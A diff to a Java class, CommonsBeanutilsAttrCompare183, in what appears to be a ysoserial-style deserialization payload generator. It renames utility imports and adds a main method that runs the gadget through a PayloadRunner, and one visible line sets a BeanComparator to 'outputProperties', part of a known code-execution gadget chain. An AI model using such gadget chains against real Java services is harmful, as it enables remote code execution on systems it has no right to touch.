@@ -1,5 +1,6 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
 import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
 import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
@@ -9,9 +10,9 @@ import javassist.CtField;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
-import A.R.ysogate.payloads.util.SuClassLoader;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.Reflections;
+import A.R.ysogate.payloads.utils.SuClassLoader;
 
 import java.util.Comparator;
 import java.util.PriorityQueue;
@@ -57,6 +58,10 @@ public class CommonsBeanutilsAttrCompare183 implements ObjectPayload<Object> {
 		Reflections.setFieldValue(beanComparator, "property", "outputProperties");
 
 		return queue;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsBeanutilsAttrCompare183.class, args);
 	}
 
 }
